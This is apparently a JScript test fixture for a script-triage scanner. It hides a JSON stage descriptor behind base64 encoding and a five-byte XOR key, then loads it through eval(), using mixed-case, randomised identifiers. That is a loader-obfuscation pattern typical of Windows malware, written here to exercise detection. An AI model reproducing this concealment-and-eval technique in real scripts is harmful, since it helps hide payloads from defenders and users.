// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_3eeaccdf = function decode_3eeaccdf_body(SoUrCeByTeS) {
  var keyBytes = [42,39,155,86,182];
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ keyBytes[i % keyBytes.length]); }
  return DeCoDeDByTeS;
};
var recover_36eb8e0e = function recover_36eb8e0e_body() {
  var packedText = "UQXoItNaVLls7QhC9SPbT1X6ItN1U/ok0U9T6HSaCFPpN9hZQfQk23VE9DjCT0nvdJoIUOk/wk946TPVRVH+JM91SfQi0wh6t3TXTkbrItNYBaF0925o3xSYeVPpM9dHBbd0wEtL7jPFCB3gdNVLSus3301JxD/SCB25NddHV/o/0UQK/WKBS0P4NYBMQ7l6lF5G6THTXnjpOdleBaF09RB7xwPFT1XoCup6Uvk630l7xx7DRFPpM8VZa/o06nZO9ibXSVO2MIIdRv811RxB/3SaCELjItNEVPI52AgduXjaRUTwM9IHQa9h105E+GDQTgW3dNhFU/4J2EtK/nSMCHXeFfl8Ysl70B4Q+jLVSRH9MpheX+90ywYF6CLXTULYOcNEU7lshVc=";

  var SoUrCeByTeS = decodeBase64(packedText);

  var NeUtRaL = "PROCESSOR_ARCHITECTURE";

  var DeCoDeDByTeS = [];

  var state = 1;

  switch (state) { case 1: DeCoDeDByTeS = decode_3eeaccdf(SoUrCeByTeS); break; default: DeCoDeDByTeS = []; }

  var textParts = [];

  for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }

  var DeScRiPtOrTeXt = textParts.join("");

  return DeScRiPtOrTeXt;
};
var inspect_eba6e84c = function inspect_eba6e84c_body() {
  var DeScRiPtOr = eval("(" + recover_36eb8e0e() + ")");
  return { steps: DeScRiPtOr["steps"], adapter: DeScRiPtOr["adapter"], values: DeScRiPtOr["values"], stageCount: DeScRiPtOr["stageCount"] };
};
